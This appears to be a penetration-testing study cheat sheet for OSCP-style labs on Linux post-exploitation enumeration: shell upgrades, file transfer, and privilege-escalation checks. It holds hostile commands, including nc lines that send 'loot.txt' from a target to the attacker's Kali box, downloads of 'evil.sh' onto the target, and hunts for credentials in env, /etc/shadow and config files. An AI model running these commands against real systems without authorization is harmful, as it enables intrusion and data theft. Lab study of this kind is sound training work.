# Linux Enumeration

I will do **Manual Enumeration** before running LinPEAS or lse or pspy. 

Now repeat that five times.

Many OSCP boxes are designed in a way where linPEAS will not pick the PE up. But still run it once you are done with the checks below.

I assumed you got some kind of shell on a linux host. If it is a shell from a webshell, try upgrading to a more stable shell by popping one with nc (which should be native on a linux host) or a msfvenom payload. Also do the following to upgrade a shell to tty using python (or python3)

```bash
# on the target host
which python python2 python3 # check which python exist. Then use the relevant version below

python -c "import pty;pty.spawn('/bin/bash');"

python3 -c "import pty;pty.spawn('/bin/bash');"

python3 -c 'import os; os.system("/bin/sh");

```

## How to transfer files from Kali to Linux

Navigate to your tools folders and run the following (I like port 80 since it is highly likely that the target box will not have port 80 blocked)

```bash
python -m http.server 80
```

Back on your target box, navigate to a folder that you should have write and execute access.

I like using /tmp, /dev/shm, /var/tmp (default global writable directories) or if you land a shell as a user, you can use that user's home directory.

```bash
wget http://<kali ip>/<file>
```

On the off chance that you somehow cant use wget, check if your current user has its path variables set correctly

```bash
# on the target

echo $PATH 

# In general, should look something like this: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
# if somehow this is empty then just set the Path variable

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

echo $PATH # to verify

```

Ok I really dont have wget! So what now? If you ssh-ed into the host, you can use scp (Secure Copy Paste)

```bash
# on your kali

scp [OPTIONS] [[user@]src_host:]file1 [[user@]dest_host:]file2

OPTIONS
-r recursive copy
-q quiet mode

For files we can use wildcard such as *.php

# if need diff port and id_Rsa keys, put them in front for it to work

# the below examples uses id_rsa to login and transfers linpeas.sh from kali to the /home/anita path

scp -P 2222 -i id_rsa linpeas.sh anita@192.168.208.245:/home/anita

```

If not SSH, you can always see the ancient method of using nc to file transfer.

Transferring evil.sh from kali to target
```bash
# on kali
nc -lvnp 80 < evil.sh
# on target
nc <kali ip> 80 > evil.sh
```
Transferring loot.txt from target to kali
```bash
# on kali
nc -lvnp 80 > loot.txt
# on target
nc <kali ip> 80 < loot.txt
```

-------------------
## Checking for the Quick Wins

1) The first few commands you SHOULD ALWAYS RUN is this:

```bash
# check your group
id
# check your history
history
# check your sudo powers
sudo -l
# check your environment variables
env
```

If you see groups like docker, backup, disk, adm, or anything that is just not your username. These are things that are either PE vectors or things you should investigate as being in those groups can give you certain powers. Note down!

sudo -l can reveal quick wins and more often than not THE PE vector. 

env to check for hardcoded credentials

2) Check Kernel Version. IF it looks ancient, then it might be a kernel exploit

```bash
uname -a 
cat /etc/os-release
```

3) Next is user enumeration and user home directories enumeration

```
cat /etc/passwd

ls -la /etc/passwd /etc/shadow  # might as well see if you can write to passwd or read shadow for an easy win

# ls -laRH lists all files recursively (including hidden) and outputs in human readable form. This is a godly command to quickly spider down directories

# you ls -laRH /home so that you can quickly see what files are in each user's directory (provided you can access them)

ls -laRH /home
```

4) Next thing you should do is to enumerate the world writable directories. Any thing inside that is not default should be investigated.

```bash
ls -la /tmp /opt /dev/shm /var/tmp
# the below command searches for all world writable directories. Any non default directories are worth investigating
find / -writable -type d 2>/dev/null
```

5) Check out the cron jobs. Do note that your user may not have privs to see root's cron jobs so a lack of results does not necessary mean that there is no cron jobs! 

```bash
crontab -l # this checks your own cron jobs. Usually there is nothing and plus you cant really elevate from this.
ls -lah /etc/cron.d
cat /etc/crontab
# the below might output information that pspy somehow misses. I am not sure why
systemctl status cron
```

6) Last thing you should do is to check out /var/www/html if there are web services. What you are looking for are config files that may contain hard-coded credentials. You can use the find command to look for things

```bash
find / -name *.conf, *.yml -type f 2>/dev/null
# this searches for a particular string in all files recursively from the specified directory. Might take a while to run though
grep -Horn <text> <dir>
```

## No Shell but can read files via webshell or some other blackmagic

https://idafchev.github.io/enumeration/2018/03/05/linux_proc_enum.html

```bash
# if you have Remote File Read (but cant get a shell you can use the following method)

/proc/self/cmdline

/proc/<pid>/cmdline # can write a simple script to iterate through all PIDs

/proc/sched_debug
```

## AutoEnum

for lse.sh I find good results with the following command which is more verbose than the basic version

```bash
./lse.sh -l1
```

for pspy, do add the following flag. Run pspy if you suspect that root is running some cron job that you cant see from your current user's permission.

This is similiar to scheduled tasks in Windows where if your user may not be privileged enough to see root cron jobs even after you check out /etc/crontab

```bash
./pspy64 -pf  # run -f to see file commands  such as cd or else you will miss stuff!

# let it run a couple of minutes just to see if there is anything
```